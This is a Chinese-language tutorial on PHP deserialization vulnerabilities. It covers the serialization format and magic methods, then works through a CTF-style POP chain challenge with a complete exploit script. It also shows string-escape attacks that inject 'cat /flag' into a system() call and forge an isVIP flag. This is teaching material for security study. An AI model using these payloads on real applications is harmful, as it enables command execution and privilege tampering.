## 序列化

序列化就是将 对象object、字符串string、数组array、变量 转换成具有一定格式的字符串，方便保持稳定的格式在文件中传输，以便还原为原来的内容。

```php
<?php
class Flag
{
    public $file = "flag";
    private $a = "aa";
    protected $b = "bb";
    public function test()
    {
        echo "hello";
    }

}
$c = new Flag();
echo serialize($c);
?>
```

输出

```
O:4:"Flag":3:{s:4:"file";s:4:"flag";s:7:"%00Flag%00a";s:2:"aa";s:4:"%00*%00b";s:2:"bb";}
```

这里面O代表对象；4代表对象名长度；Flag是对象名；3是对象里面的成员变量的数量；同时注意到类里面的方法并不会序列化。

```
注意：当访问控制修饰符(public、protected、private)不同时，序列化后的结果也不同，`%00` 虽然不会显示，但是提交还是要加上去。

public : 被序列化的时候属性名 不会更改

protected : 被序列化的时候属性名 会变成 %00*%00属性名

private : 被序列化的时候属性名 会变成 %00类名%00属性名

输出时一般需要url编码，若在本地存储更推荐采用base64编码的形式
```

## 反序列化

反序列化就是序列化的逆过程。

```php
<?php
class Flag
{
    public $file = "flag";
    private $a = "aa";
    protected $b = "bb";
    public function test()
    {
        echo "hello";
    }

}
$c = new Flag();
$c1 = serialize($c);
echo $c1;
$c2 = unserialize($c1);
var_dump($c2);
?>
```

输出

```
O:4:"Flag":3:{s:4:"file";s:4:"flag";s:7:" Flag a";s:2:"aa";s:4:" * b";s:2:"bb";}object(Flag)#2 (3) {
  ["file"]=>
  string(4) "flag"
  ["a":"Flag":private]=>
  string(2) "aa"
  ["b":protected]=>
  string(2) "bb"
}
```

## 魔术方法

![image-20240118202217451](https://dabai-1316520326.cos.ap-nanjing.myqcloud.com/img/image-20240118202217451.png)

反序列化漏洞里会有一些魔术方法

```
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()时，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不可访问的方法时触发
__callStatic() //在静态上下文中调用不可访问的方法时触发
__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法
__set() //用于将数据写入不可访问的属性
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把类当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
```

知识点：

```
__serialize和__unserialize魔术方法
注意:
1.这两个魔术方法需要php7.4以上才能生效
2.当__serialize和__sleep方法同时存在，序列化时忽略__sleep方法而执行__serialize;
3.当__unserialize方法和__wakeup方法同时存在，反序列化时忽略__wakeup方法而执行__unserialize;
4.__unserialize的参数：当__serialize方法存在时，参数为__serialize的返回数组；当__serialize方法不存在时，参数为实例对象的所有属性值组合而成的数组
```

## PHP反序列化POP链

### POP链介绍

从源代码中寻找一系列的代码或者指令调用，魔术方法的调用，然后根据需求构成一组连续的调用链，完成攻击的目的。

### POP链demo

```php
<?php
include("./xxxiscc.php");
class boy {
    public $like;
    public function __destruct() {
        echo "能请你喝杯奶茶吗？<br>";
        @$this->like->make_friends();
    }
    public function __toString() {
        echo "拱火大法好<br>";
        return $this->like->string;
    }
}

class girl {
    private $boyname;
    public function __call($func, $args) {
        echo "我害羞羞<br>";
        isset($this->boyname->name);  
    }
}

class helper {
    private $name;
    private $string;
    public function __construct($string) {
        $this->string = $string;
    }
    public function __isset($val) {
        echo "僚机上线<br>";
        echo $this->name;
    }
    public function __get($name) {
        echo "僚机不懈努力<br>";
        $var = $this->$name;
        $var[$name]();
    }
}
class love_story {
    public function love() {
        echo "爱情萌芽<br>";
        array_walk($this, function($make, $colo){
            echo "坠入爱河，给你爱的密码<br>";
            if ($make[0] === "girl_and_boy" && $colo === "fall_in_love") {
                global $flag;
                echo $flag;
            }
        });
    }
}
if (isset($_GET["iscc"])) {
    $a=unserialize($_GET['iscc']);
} else {
    highlight_file(__FILE__);
}
```

```
Pop链：
boy::__destruct()-->girl::__call()-->helper::__isset()-->boy::__toString()-->helper::__get()
找到可以利用的方法boy类的__destruct()，它调用了不可访问的方法make_friends(),触发girl类的__call()方法，isset()触发了helper类中的__isset()方法，当name是一个类对象时，触发boy类中的__tostring()方法，return $this->like->string; 访问或读取了不可私有的属性，触发helper类的__get方法 （链可以看懂，脚本不会写）
```

脚本

```php
<?php
class boy {
    public $like;
}
class girl {
    public $boyname;
}
class helper {
    public $name;
    private $string;
    public function __construct() {
        $this->string = array("string"=>[new love_story(),"love"]);
    }
}
class love_story {
    public $fall_in_love = array(0=>'girl_and_boy');
}
$boy= new boy();
$boy1 = new boy();
$girl = new girl();
$help= new helper();
$help1 = new helper();
$boy->like = $girl;
$girl->boyname = $help;
$help->name = $boy1;
$boy1->like=$help1;
$n = null;
$a = array($boy,$n);
echo urlencode(serialize($a));
?>
```

## PHP反序列化字符串逃逸

### 原理

```
当开发者使用先将对象序列化，然后将对象中的字符进行过滤，最后再进行反序列化。这个时候就有可能会产生PHP反序列化字符逃逸的漏洞。
```

### 字符串增多逃逸

参考链接：[php反序列化字符逃逸](http://t.csdnimg.cn/aMcgn)

```php
<?php
highlight_file(__FILE__);
function waf($str){
    return str_replace("bad","good",$str);
}
class GetFlag {
    public $key;
    public $cmd = "whoami";
    public function __construct($key)
    {
        $this->key = $key;
    }
    public function __destruct()
    {
        system($this->cmd);
    }
}
unserialize(waf(serialize(new GetFlag($_GET['key']))));
```

这里我们需要更改`cmd`变量的值来进行命令执行

```
O:7:"GetFlag":2:{s:3:"key";s:3:"bad";s:3:"cmd";s:9:"cat /flag";} //没进waf
O:7:"GetFlag":2:{s:3:"key";s:3:"good";s:3:"cmd";s:9:"cat /flag";} //bad被换后，它的长度没有变化
```

我们要将`whoami`变成`cat /flag`，所以我们需要逃逸的字符是

`";s:3:"cmd";s:9:"cat /flag";}`这里前面的";是为了将bad参数位置处的双引号闭合

`";s:3:"cmd";s:9:"cat /flag";}`的长度是29，我们就需要29个bad

```php
<?php
class GetFlag
{
    public $key='badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad";s:3:"cmd";s:9:"cat /flag";}';
    public $cmd = "cat /flag";
}
function waf($str){
    return str_replace("bad","good",$str);
}
$a = new GetFlag();
$b= serialize($a)."\n";
echo $b;
$c = waf($b)."\n";
echo $c;
var_dump(unserialize($c));
?>
```

输出：

```
object(GetFlag)#2 (2) {
  ["key"]=>
  string(116) "goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood"
  ["cmd"]=>
  string(9) "cat /flag"
}
```

cmd的值就是我们要的值了

### 字符串减少逃逸

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;

    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($obj) {
    return str_replace("dabai","hai",$obj);
}

$obj = new user('dabai','123456');
$obj = filter(serialize($obj));
echo $obj;
?>
```

输出：

```
O:4:"user":3:{s:8:"username";s:5:"hai";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

`username`的值admin被替换成hack，长度减一

php反序列化有一个特性：

**当序列化字符串属性的长度不够时，会往后走，直到长度与规定的长度相等为止**

这时候username的值就变成了`hai";`，导致无法进行反序列化

我们计算一下**本可控变量末尾到下一可控变量的长度**，就是我们需要吃掉的字符串

```
";s:8:"password";s:6:" //长度是22
```

我们要传11个dabai

```
O:4:"user":3:{s:8:"username";s:55:"haihaihaihaihaihaihaihaihaihaihai";s:8:"password";s:6:"123456";s:5:"isVIP";i:0;}
```

这里username值的长度是55，所以它的值就是`haihaihaihaihaihaihaihaihaihaihai";s:8:"password";s:6:"`

我们要进行逃逸的字符串：

```
";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;} //将isVIP的值变成1
```

我们将它赋值给password，输出

```
O:4:"user":3:{s:8:"username";s:55:"haihaihaihaihaihaihaihaihaihaihai";s:8:"password";s:47:"";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}";s:5:"isVIP";i:0;}
```

取出来`haihaihaihaihaihaihaihaihaihaihai";s:8:"password";s:47:`它的长度是55，但这里还多出一个`"`，这里是因为password值的长度从6变成了47（字符串长度增了1）

我们再添加一个dabai，长度再减2

完整代码：

```php
<?php
class user
{
    public $username;
    public $password;
    public $isVIP;
    public function __construct($u, $p)
    {
        $this->username = $u;
        $this->password = $p;
        $this->isVIP = 0;
    }
}

function filter($obj) {
    return str_replace("dabai","hai",$obj);
}

$obj = new user('dabaidabaidabaidabaidabaidabaidabaidabaidabaidabaidabaidabai','a";s:8:"password";s:6:"123456";s:5:"isVIP";i:1;}');
$obj = filter(serialize($obj));
echo $obj."\n";
var_dump(unserialize($obj));
?>
```

反序列化后输出：

```
object(user)#1 (3) {
  ["username"]=>
  string(60) "haihaihaihaihaihaihaihaihaihaihaihai";s:8:"password";s:48:"a"
  ["password"]=>
  string(6) "123456"
  ["isVIP"]=>
  int(1)
}
```

逃逸成功，isVIP的值变成了1
